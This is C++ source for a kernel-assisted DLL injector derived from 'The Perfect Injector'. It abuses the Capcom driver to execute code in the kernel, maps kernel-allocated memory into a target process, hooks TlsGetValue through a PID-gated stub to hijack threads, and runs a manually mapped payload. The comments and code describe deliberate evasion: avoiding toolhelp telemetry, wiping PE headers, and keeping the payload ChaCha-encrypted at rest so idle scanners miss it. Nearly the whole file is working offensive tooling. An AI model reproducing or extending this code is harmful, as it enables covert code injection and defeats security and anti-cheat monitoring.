#include <iostream>
#include <Windows.h>
#include <tlhelp32.h>
#include <Psapi.h>
#include <map>
#include <string>
#include <cstdlib>
#include <vector>
#include <functional>
#include "Error.h"
#include "MemoryController.h"
#include "SimpleMapper.h"
#include "PayloadCrypto.h"
#include "LockedMemory.h"
#pragma comment(lib, "psapi.lib")

//
// Improvements over the original injector:
//   * The target is found by walking the kernel process list through the
//     physical map instead of CreateToolhelp32Snapshot (recon telemetry).
//   * Payload imports are resolved at map time; the target runs no
//     LoadLibrary/GetProcAddress and gains no modules.
//   * PE headers are wiped, __security_cookie is randomized, ordinals work.
//   * Page permissions come from the section headers, so no page is ever
//     exposed writable+executable.
//   * The hook can be installed through a process handle (WriteProcessMemory
//     breaks copy-on-write => the patch is private to the target) or through
//     the physical map (no handle at all), with a PFN check reporting which
//     one you actually got.
//   * The shared page window is closed as soon as the stub counter drains
//     instead of after a fixed sleep.
//   * KVA shadow aware: the exposed pages are wired into the *user* CR3 as
//     well, and verified, instead of only flipping U/S bits in the kernel
//     tables (which does nothing for CPL3 when KVAS is on).
//

PVOID AllocateKernelMemory( CapcomContext* CpCtx, KernelContext* KrCtx, SIZE_T Size )
{
	NON_PAGED_DATA static auto k_ExAllocatePool = KrCtx->GetProcAddress<fnFreeCall>( "ExAllocatePool" );
	NON_PAGED_DATA static uint64_t MemOut;

	CpCtx->ExecuteInKernel( NON_PAGED_LAMBDA( PVOID Pv )
	{
		MemOut = Khk_CallPassive( k_ExAllocatePool, 0ull, Pv );
	}, ( PVOID ) Size );

	return ( PVOID ) MemOut;
}

// Page-table pages handed out to wire the exposed region into a page table tree
// must stay resident and alive for the lifetime of the injector.
static std::vector<PVOID> g_TableFrames;

static std::function<uint64_t()> MakeTableFrameAllocator( MemoryController& Mc )
{
	return [ &Mc ] () -> uint64_t
	{
		PVOID Page = VirtualAlloc( nullptr, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

		if ( !Page )
			return 0;

		memset( Page, 0, 0x1000 );

		if ( !VirtualLock( Page, 0x1000 ) )
		{
			VirtualFree( Page, 0, MEM_RELEASE );
			return 0;
		}

		g_TableFrames.push_back( Page );

		Mc.TargetDirectoryBase = Mc.CurrentDirectoryBase;
		uint64_t Pa = Mc.VirtToPhys( Page );

		if ( !Pa )
			printf( "[!] Could not resolve the physical address of a page-table page\n" );

		return Pa;
	};
}

static BOOL ExposeKernelMemoryToProcess( MemoryController& Mc, PVOID Memory, SIZE_T Size, uint64_t EProcess, const std::vector<BYTE>& PageFlags )
{
	uint64_t KernelCr3 = Mc.ReadVirtual<uint64_t>( ( PUCHAR ) EProcess + Mc.DirectoryTableBaseOffset );

	if ( !KernelCr3 )
		KernelCr3 = Mc.CurrentDirectoryBase;

	uint64_t UserCr3 = Mc.DiscoverUserDirectoryTableBase( EProcess, KernelCr3 );

	printf( "[+] Cr3: kernel %016llx user %016llx%s\n",
		KernelCr3, UserCr3, ( UserCr3 != KernelCr3 ) ? " (kva shadow)" : "" );

	auto Alloc = MakeTableFrameAllocator( Mc );
	BOOL Success = TRUE;

	Mc.AttachTo( EProcess );

	Mc.IterPhysRegion( Memory, Size, [ & ] ( PVOID Va, uint64_t Pa, SIZE_T Sz )
	{
		Mc.TargetDirectoryBase = KernelCr3;

		if ( !Pa )
		{
			Success = FALSE;
			return;
		}

		SIZE_T Index = ( ( PUCHAR ) Va - ( PUCHAR ) Memory ) / 0x1000;
		BYTE Flags = ( Index < PageFlags.size() ) ? PageFlags[ Index ] : ( BYTE ) 0x2;

		bool Executable = ( Flags & 0x1 ) != 0;
		bool Writable = ( Flags & 0x2 ) != 0;

		if ( !Mc.MapUserPage( Va, Pa, Executable, Writable, Alloc ) )
			Success = FALSE;

		if ( UserCr3 != KernelCr3 )
		{
			Mc.TargetDirectoryBase = UserCr3;

			if ( !Mc.MapUserPage( Va, Pa, Executable, Writable, Alloc ) )
			{
				Success = FALSE;
			}
			else if ( Mc.VirtToPhys( Va ) != Pa )
			{
				printf( "[!] User-cr3 verification failed at %p\n", Va );
				Success = FALSE;
			}
		}
	} );

	Mc.TargetDirectoryBase = Mc.CurrentDirectoryBase;

	return Success;
}

PUCHAR FindKernelPadSinglePage( PUCHAR Start, SIZE_T Size )
{
	PUCHAR It = Start;

	MEMORY_BASIC_INFORMATION Mbi;

	PUCHAR StreakStart = 0;
	int Streak = 0;

	do
	{
		if ( ( 0x1000 - ( uint64_t( It ) & 0xFFF ) ) < Size )
		{
			It++;
			continue;
		}

		if ( *It == 0 )
		{
			if ( !Streak )
				StreakStart = It;
			Streak++;
		}
		else
		{
			Streak = 0;
			StreakStart = 0;
		}

		if ( Streak >= Size )
			return StreakStart;

		VirtualQuery( It, &Mbi, sizeof( Mbi ) );

		It++;
	}
	while ( ( Mbi.Protect == PAGE_EXECUTE_READWRITE || Mbi.Protect == PAGE_EXECUTE_READ || Mbi.Protect == PAGE_EXECUTE_WRITECOPY ) );
	return 0;
}

// Fallback only: toolhelp snapshots are reconnaissance telemetry.
uint32_t FindProcess( const std::string& Name )
{
	PROCESSENTRY32 ProcessEntry;
	ProcessEntry.dwSize = sizeof( PROCESSENTRY32 );
	HANDLE ProcessSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, NULL );
	if ( Process32First( ProcessSnapshot, &ProcessEntry ) )
	{
		do
		{
			if ( !stricmp( ProcessEntry.szExeFile, Name.data() ) )
			{
				CloseHandle( ProcessSnapshot );
				return ProcessEntry.th32ProcessID;
			}
		}
		while ( Process32Next( ProcessSnapshot, &ProcessEntry ) );
	}
	CloseHandle( ProcessSnapshot );
	return 0;
}

static bool WriteTarget( MemoryController& Mc, uint64_t EProcess, HANDLE Process, PVOID Dst, const void* Src, SIZE_T Size, bool PreferHandle )
{
	if ( PreferHandle && Process )
	{
		SIZE_T Written = 0;
		if ( WriteProcessMemory( Process, Dst, Src, Size, &Written ) && Written == Size )
			return true;

		printf( "[!] WriteProcessMemory failed (%lu), using the physical path\n", GetLastError() );
	}

	Mc.AttachIfCanRead( EProcess, Dst );
	return Mc.WriteVirtual( ( PVOID ) Src, Dst, Size ) == Size;
}

static SIZE_T ReadTarget( MemoryController& Mc, uint64_t EProcess, PVOID Src, PVOID Dst, SIZE_T Size )
{
	Mc.AttachIfCanRead( EProcess, Src );
	return Mc.ReadVirtual( Src, Dst, Size );
}

template<typename T>
static T ReadTargetValue( MemoryController& Mc, uint64_t EProcess, PVOID Src )
{
	T Value = {};
	ReadTarget( Mc, EProcess, Src, &Value, sizeof( T ) );
	return Value;
}

static uint64_t PagePfn( MemoryController& Mc, PVOID Va )
{
	Mc.TargetDirectoryBase = Mc.CurrentDirectoryBase;
	uint64_t Pa = Mc.VirtToPhys( Va );
	return Pa >> 12;
}

static const char* ConHdr = "=================================================\n"
                            "|             The Perfect Injector              |\n"
	                        "| This software is distributed free of charge.  |\n"
	                        "| If you bought this you have been scammed.     |\n"
	                        "| https://github.com/can1357/ThePerfectInjector |\n"
	                        "=================================================\n\n";

int main( int argc, char**argv )
{
	std::string ProcessName = argc > 1 ? argv[ 1 ] : "";
	std::string DllPath = argc > 2 ? argv[ 2 ] : "";

	// flags: noloadlib keepheaders toolhelp hotkey handle quiet pid=<n> waitkey

	std::map<std::string, bool> Flags;
	uint64_t ExplicitPid = 0;

	for ( int i = 3; i < argc; i++ )
	{
		std::string Str = argv[ i ];
		for ( auto& c : Str )
			c = tolower( c );

		if ( Str.rfind( "pid=", 0 ) == 0 )
			ExplicitPid = strtoull( Str.c_str() + 4, nullptr, 0 );
		else
			Flags[ Str ] = true;
	}

	SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), 0xF );
	printf( ConHdr );
	SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), 0x8 );

	if ( !ProcessName.size() && !ExplicitPid )
	{
		printf( "Enter the target process name: " );
		std::cin >> std::ws;
		getline( std::cin, ProcessName );
	}
	if ( !DllPath.size() )
	{
		printf( "Enter the path to the module: " );
		std::cin >> std::ws;
		getline( std::cin, DllPath );
	}

	printf( "\n" );
	SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), 13 );

	printf( "Flags:         " );

	for ( int i = 3; i < argc; i++ )
		printf( "'%s' ", argv[ i ] );
	printf( "\n" );

	printf( "Dll Path:      '%s'\n", DllPath.data() );
	printf( "Process Name:  '%s'\n", ProcessName.data() );
	if ( ExplicitPid )
		printf( "Process Id:    %llu\n", ExplicitPid );
	printf( "\n" );

	const bool PreferHandle = Flags[ "handle" ] || Flags[ "hookmode:handle" ];
	const bool WipeHeaders = !Flags[ "keepheaders" ];
	const bool AllowLoad = !Flags[ "noloadlib" ];

	// Initialize physical memory controller
	SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), 12 );
	KernelContext* KrCtx;
	CapcomContext* CpCtx;
	MemoryController Controller = Mc_InitContext( &CpCtx, &KrCtx );

	if ( Controller.CreationStatus )
		ERROR( "Controller Raised A Creation Status" );

	char SelfName[ 16 ] = {};
	GetModuleBaseNameA( NtCurrentProcess(), nullptr, SelfName, sizeof( SelfName ) - 1 );

	if ( !Controller.DiscoverImageFileNameOffset( SelfName ) )
		printf( "[!] ImageFileName offset not found, name lookup unavailable\n" );
	else
		printf( "[+] ImageFileName@                            %16llx\n", Controller.ImageFileNameOffset );

	// Hook a very commonly used function
	PUCHAR _TlsGetValue = ( PUCHAR ) GetProcAddress( GetModuleHandleA( "KERNEL32" ), "TlsGetValue" ); // Not &TlsGetValue to avoid __imp intermodule calls

																									  // kernel32._TlsGetValue - EB 1E                 - jmp kernel32._TlsGetValue+
																									  // KERNEL32._TlsGetValue - E9 CBD70100           - jmp KERNEL32.UTUnRegister+160
	if ( !( *_TlsGetValue == 0xE9 || *_TlsGetValue == 0xEB ) )
		ERROR( "TlsGetValue does not start with a jmp, unsupported build" );

	PUCHAR Target = ( *_TlsGetValue == 0xEB ) ? ( _TlsGetValue + 2 + *( int8_t* ) ( _TlsGetValue + 1 ) ) : ( _TlsGetValue + 5 + *( int32_t* ) ( _TlsGetValue + 1 ) );

	// Map module to kernel and create a hook stub
	std::vector<std::pair<PVOID, SIZE_T>> UsedRegions;
	std::vector<BYTE> PageFlags;
	Mp_Region MappedRegion = {};

	uint8_t PayloadKey[ 32 ], PayloadNonce[ 12 ];
	Mp_GenerateKey( PayloadKey, PayloadNonce );

	TlsLockedHookController* TlsHookController = Mp_MapDllAndCreateHookEntry( DllPath, _TlsGetValue, Target, AllowLoad, [ & ] ( SIZE_T Size )
	{
		PVOID Memory = AllocateKernelMemory( CpCtx, KrCtx, Size );

		if ( !Memory )
			return Memory;

		// The injector itself needs a writable mapping of the region: the stub,
		// the relocations and the IAT are written through this window.
		std::vector<BYTE> AllWrite( ( Size + 0xFFF ) / 0x1000, 0x2 );
		ExposeKernelMemoryToProcess( Controller, Memory, Size, Controller.CurrentEProcess, AllWrite );
		ZeroMemory( Memory, Size );
		UsedRegions.push_back( { Memory, Size } );
		return Memory;
	}, WipeHeaders, &PageFlags, &MappedRegion );

	if ( !TlsHookController )
		ERROR( "Mapping Failed" );

	// Encrypt the image at rest: the region is only plaintext while the payload
	// runs, so an idle scanner finds a keystream blob instead of a PE layout.
	if ( MappedRegion.ImageSize )
	{
		Mp_ChaChaApply( ( PVOID ) MappedRegion.ImageBase, MappedRegion.ImageSize, PayloadKey, PayloadNonce );
		printf( "[+] Payload encrypted at rest (%08x bytes)\n", MappedRegion.ImageSize );
	}

	// Unload driver
	Cl_FreeContext( CpCtx );
	Kr_FreeContext( KrCtx );

	printf( "\n" );
	SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), 10 );

	if ( Flags[ "waitkey" ] || Flags[ "hotkey" ] )
	{
		printf( "Waiting for F2 key...\n" );
		while ( !( GetAsyncKeyState( VK_F2 ) & 0x8000 ) )
			Sleep( 10 );
	}

	printf( "Waiting for %s...\n", ProcessName.size() ? ProcessName.data() : "the target process" );

	uint64_t EProcess = 0;

	while ( !EProcess )
	{
		if ( ExplicitPid )
		{
			EProcess = Controller.FindEProcess( ExplicitPid );
		}
		else if ( Controller.ImageFileNameOffset )
		{
			EProcess = Controller.FindEProcessByName( ProcessName.c_str() );
		}
		else if ( Flags[ "toolhelp" ] )
		{
			uint32_t Pid = FindProcess( ProcessName );
			if ( Pid )
				EProcess = Controller.FindEProcess( Pid );
		}

		Sleep( 10 );
	}

	printf( "Found the target!\n" );

	printf( "\n" );
	SetConsoleTextAttribute( GetStdHandle( STD_OUTPUT_HANDLE ), 11 );

	printf( "[-] EProcess:                               %16llx\n", EProcess );

	// Expose region to process
	for ( auto Region : UsedRegions )
	{
		printf( "[-] Exposing %16llx (%08llx bytes) to the target\n", ( uint64_t ) Region.first, ( uint64_t ) Region.second );
		if ( !ExposeKernelMemoryToProcess( Controller, Region.first, Region.second, EProcess, PageFlags ) )
			printf( "[!] Exposure reported a problem, check the Cr3 lines above\n" );
	}

	std::vector<BYTE> PidBasedHook =
	{
		0x65, 0x48, 0x8B, 0x04, 0x25, 0x30, 0x00, 0x00, 0x00,        // mov rax, gs:[0x30]
		0x8B, 0x40, 0x40,                                            // mov eax,[rax+0x40] ; pid
		0x3D, 0xDD, 0xCC, 0xAB, 0x0A,                                // cmp eax, 0xAABCCDD
		0x0F, 0x85, 0x00, 0x00, 0x00, 0x00,                          // jne 0xAABBCC
		0x48, 0xB8, 0xAA, 0xEE, 0xDD, 0xCC, 0xBB, 0xAA, 0x00, 0x00,  // mov rax, 0xAABBCCDDEEAA
		0xFF, 0xE0                                                    // jmp rax
	};

	PUCHAR PadSpace = FindKernelPadSinglePage( _TlsGetValue, PidBasedHook.size() );

	if ( !PadSpace )
		ERROR( "Couldn't Find Appropriate Padding" );

	uint32_t TargetPid = ExplicitPid ? ( uint32_t ) ExplicitPid : ( uint32_t ) ( Flags[ "toolhelp" ] ? FindProcess( ProcessName ) : 0 );

	printf( "[-] Hooking TlsGetValue @                   %16llx\n", ( uint64_t ) _TlsGetValue );
	printf( "[-] TlsGetValue Redirection Target:         %16llx\n", ( uint64_t ) Target );
	printf( "[-] Stub located at:                        %16llx\n", ( uint64_t ) PadSpace );
	printf( "[-] Image located at:                       %16llx\n", ( uint64_t ) TlsHookController );

	*( uint32_t* ) ( &PidBasedHook[ 0xD ] ) = TargetPid; // Pid
	*( int32_t* ) ( &PidBasedHook[ 0x13 ] ) = ( int32_t ) ( Target - ( PadSpace + 0x17 ) ); // Jmp
	*( PUCHAR* ) ( &PidBasedHook[ 0x19 ] ) = &TlsHookController->EntryBytes; // Hook target

																			 // Backup and complete hook
	BYTE Jmp[ 5 ];
	Jmp[ 0 ] = 0xE9;
	*( int32_t* ) ( Jmp + 1 ) = ( int32_t ) ( PadSpace - ( _TlsGetValue + 5 ) );

	std::vector<BYTE> Backup1( PidBasedHook.size(), 0 );
	std::vector<BYTE> Backup2( 5, 0 );

	TlsHookController->NumThreadsWaiting = 0;
	TlsHookController->IsFree = FALSE;

	Controller.Detach();

	// The pid check must match the pid the target actually has: when the name
	// based lookup was used, read it back out of the EPROCESS instead of
	// assuming anything.
	if ( !TargetPid )
		TargetPid = ( uint32_t ) Controller.ReadVirtual<uint64_t>( ( PUCHAR ) EProcess + Controller.UniqueProcessIdOffset );

	*( uint32_t* ) ( &PidBasedHook[ 0xD ] ) = TargetPid;

	printf( "[-] Target pid:                             %16x\n", TargetPid );
	printf( "[-] Patch mode:                             %s\n", PreferHandle ? "process handle (private copy)" : "physical map (shared pages)" );

	HANDLE TargetProcess = nullptr;

	if ( PreferHandle )
	{
		TargetProcess = OpenProcess( PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, TargetPid );

		if ( !TargetProcess )
			printf( "[!] OpenProcess failed (%lu), falling back to the physical path\n", GetLastError() );
	}

	uint64_t SharedPfn = PagePfn( Controller, _TlsGetValue );

	printf( "[-] Writing stub to padding...\n" );
	ReadTarget( Controller, EProcess, PadSpace, Backup1.data(), PidBasedHook.size() );
	if ( !WriteTarget( Controller, EProcess, TargetProcess, PadSpace, PidBasedHook.data(), PidBasedHook.size(), PreferHandle ) )
		ERROR( "Failed to write the pid check stub" );

	printf( "[-] Writing the hook to TlsGetValue...\n" );
	ReadTarget( Controller, EProcess, _TlsGetValue, Backup2.data(), 5 );
	if ( !WriteTarget( Controller, EProcess, TargetProcess, _TlsGetValue, Jmp, 5, PreferHandle ) )
		ERROR( "Failed to write the hook" );

	// Report whether the patched pages are actually private to the target. A
	// changed PFN means copy-on-write was broken and no other process can see
	// the patched bytes.
	{
		Controller.AttachTo( EProcess );
		uint64_t TargetPfn = Controller.VirtToPhys( _TlsGetValue ) >> 12;
		Controller.Detach();

		if ( TargetPfn && TargetPfn != SharedPfn )
			printf( "[+] Patched page is private to the target (pfn %llx -> %llx)\n", SharedPfn, TargetPfn );
		else
			printf( "[!] Patched page is still shared (pfn %llx), the write is visible to other processes until it is restored\n", SharedPfn );
	}

	printf( "[-] Hooked! Waiting for threads to spin...\n" );

	// Wait for threads to lock
	uint64_t TStart = GetTickCount64();
	while ( !ReadTargetValue<BYTE>( Controller, EProcess, &TlsHookController->NumThreadsWaiting ) &&
			( Flags[ "hotkey" ] ? !( GetAsyncKeyState( VK_F1 ) & 0x8000 ) : true ) &&
			( ( GetTickCount64() - TStart ) < 5000 ) )
		Sleep( 1 );

	uint8_t Waiting = ReadTargetValue<BYTE>( Controller, EProcess, &TlsHookController->NumThreadsWaiting );
	printf( "[-] Threads spinning:                       %16x\n", Waiting );

	// Restore the entry first so new callers never reach the stub
	WriteTarget( Controller, EProcess, TargetProcess, _TlsGetValue, Backup2.data(), 5, PreferHandle );

	if ( Waiting )
		printf( "[-] Unhooked and started thread hijacking!\n" );
	else
		printf( "[-] ERROR: Wait timed out...\n" );

	// Decrypt just before releasing the threads: plaintext exists only for the
	// execution window.
	if ( MappedRegion.ImageSize )
	{
		Mp_ChaChaApply( ( PVOID ) MappedRegion.ImageBase, MappedRegion.ImageSize, PayloadKey, PayloadNonce );
		printf( "[+] Payload decrypted for execution\n" );
	}

	TlsHookController->IsFree = TRUE;

	// Close the shared window as soon as the stub counter drains instead of
	// holding the modified padding for a fixed sleep.
	TStart = GetTickCount64();
	while ( ReadTargetValue<BYTE>( Controller, EProcess, &TlsHookController->NumThreadsWaiting ) &&
			( ( GetTickCount64() - TStart ) < 3000 ) )
		Sleep( 1 );

	WriteTarget( Controller, EProcess, TargetProcess, PadSpace, Backup1.data(), Backup1.size(), PreferHandle );
	printf( "[-] Padding restored\n" );

	// The counter hitting zero only means every thread passed the gate; the one
	// that ran the payload is still inside it. Wait for the stub's completion
	// flag before the image is touched again.
	TStart = GetTickCount64();
	while ( !ReadTargetValue<BYTE>( Controller, EProcess, &TlsHookController->Done ) &&
			( ( GetTickCount64() - TStart ) < 5000 ) )
		Sleep( 1 );

	if ( MappedRegion.ImageSize )
	{
		Mp_ChaChaApply( ( PVOID ) MappedRegion.ImageBase, MappedRegion.ImageSize, PayloadKey, PayloadNonce );
		printf( "[+] Payload re-encrypted at rest\n" );
	}

	if ( TargetProcess )
		CloseHandle( TargetProcess );

	for ( PVOID Page : g_TableFrames )
		VirtualUnlock( Page, 0x1000 );

	return 0;
}
